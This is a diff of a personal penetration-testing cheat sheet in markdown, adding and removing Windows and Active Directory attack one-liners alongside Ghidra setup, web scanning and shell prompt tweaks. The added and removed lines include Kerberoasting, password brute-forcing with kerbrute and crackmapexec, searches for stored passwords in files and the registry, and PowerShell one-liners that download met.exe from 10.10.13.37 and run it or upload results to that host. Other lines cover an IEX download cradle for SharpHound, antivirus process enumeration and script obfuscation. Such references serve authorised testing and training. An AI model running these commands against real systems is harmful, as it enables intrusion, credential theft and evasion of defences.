+PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
+```
+
+
+#### Seatbelt
+
+* [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+* [github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
+
+
+### One-liners
+
+PowerShell ping sweep:
+
+```
+echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
+```
+
+PowerShell auto detect proxy, download file from remote HTTP server and run it:
+
+```
+$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
+```
+
+PowerShell manually set proxy and upload file to remote HTTP server:
+
+```
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+```
+
+
+
+### Unsorted
+
+```
 root@kali:$ kerbrute userenum -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
-root@kali:$ GetNPUsers.py MEGACORP.LOCAL/ -dc-ip 127.0.0.1 -request
-root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
 root@kali:$ kerbrute bruteuser -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
-root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 
 PS > systeminfo
 PS > whoami /priv (whoami /all)
@@ -2849,98 +2839,56 @@ PS > (wmic os get OSArchitecture)[2]
 PS > [Environment]::Is64BitOperatingSystem
 PS > $ExecutionContext.SessionState.LanguageMode
 
-PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
-PS > cmd /c where /R C:\ *.ini
-PS > REG QUERY HKLM /f "password" /t REG_SZ /s
-PS > REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
-PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
-
-PS > .\winPEAS.bat
-PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
-PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
-PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
-
 PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
-
-PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "avp.exe","MsMpEng.exe","cpda.exe"} | select ProcessName,PSComputerName}
 ```
 
-`PowerView.ps1`:
+Common AV process names:
 
-* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
-* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
-* [PowerView 2.0](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
-* [PowerView 3.0 [dev]](https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1)
-
-```
-PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
-PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
-```
-
-`PowerUp.ps1`:
-
-* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
-* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
+| Process Name |          Vendor/Product          |
+|--------------|----------------------------------|
+| avp.exe      | Kaspersky Internet Security      |
+| cpda.exe     | End Point Security (Check Point) |
+| MsMpEng.exe  | Windows Defender                 |
+| ntrtscan.exe | Trend Micro OfficeScan           |
+| tmlisten.exe | Trend Micro OfficeScan           |
 
 ```
-PS > Invoke-PrivescAudit
-```
-
-`Invoke-Portscan.ps1`:
-
-* [github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
-* [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
-
-```
-PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
-```
-
-`Inveigh.ps1`:
-
-* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-
-```
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
-```
-
-`Invoke-Obfuscation.ps1`:
-
-* [github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
-* [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
-
-`Out-EncryptedScript.ps1`:
-
-* [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
-* [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
-
-```
-PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
-PS > [string] $cmd = gc .\evil
-PS > $dec = de "Passw0rd!" s4lt
-PS > Invoke-Expression $dec
+PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "name1.exe","name2.exe"} | select ProcessName,PSComputerName}
 ```
 
 
-#### One-liners
 
-PowerShell ping sweep:
+
+
+# Reverse & PWN
+
+
+
+
+
+## Ghidra
+
+Download through Tor:
+
+* [ghidra-sre.org/](https://ghidra-sre.org/)
+
+Install:
 
 ```
-echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
+$ mv /opt/tor-browser/Browser/Downloads/ghidra*.zip ~/tools
+$ cd ~/tools && unzip ghidra*.zip && rm ghidra*.zip && mv ghidra* ghidra && cd -
+$ sudo apt install openjdk-11-jdk
 ```
 
-PowerShell auto detect proxy, download file from remote HTTP server and run it:
+
+
+
+
+# Web
 
 ```
-$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
-```
-
-PowerShell manually set proxy and upload file to remote HTTP server:
-
-```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ nikto -h http://127.0.0.1 -Cgidirs all
 ```
 
 
@@ -3204,7 +3152,7 @@ $ twine upload dist/*
 
 
 
-## MISC
+## Misc
 
 
 
@@ -3952,7 +3900,7 @@ $ sudo fail2ban-client unban --all
 #### script
 
 ```
-$ script script-$(date "+%FT%H%M%S").log
+$ script tool-$(date "+%FT%H%M%S").script
 ```
 
 
@@ -3981,9 +3929,14 @@ PS1='${debian_chroot:!($debian_chroot)}[\D!d}|\D{!k:!M}] \[\033[01;32m\]λ  \[\0
 `$ZSH_CUSTOM/themes/robbyrussell.zsh-theme` (replace `!` with `%`):
 
 ```
-PROMPT="[!D{!d}|!D{!k:!M}] "
-PROMPT+="!(?:!{$fg_bold[green]!}➜ :!{$fg_bold[red]!}➜ ) "
+PROMPT="!(?:!{$fg_bold[green]!}➜ :!{$fg_bold[red]!}➜ ) "
 PROMPT+='!{$fg[cyan]!}!(4~|!-1~/…/!2~|!3~)!{$reset_color!} $(git_prompt_info)'
+
+if lsof -tac script "$(tty)" > /dev/null; then
+    PROMPT="[!D{!d}|!D{!k:!M}]* $PROMPT"
+else
+    PROMPT="[!D{!d}|!D{!k:!M}] $PROMPT"
+fi
 ```
 
 
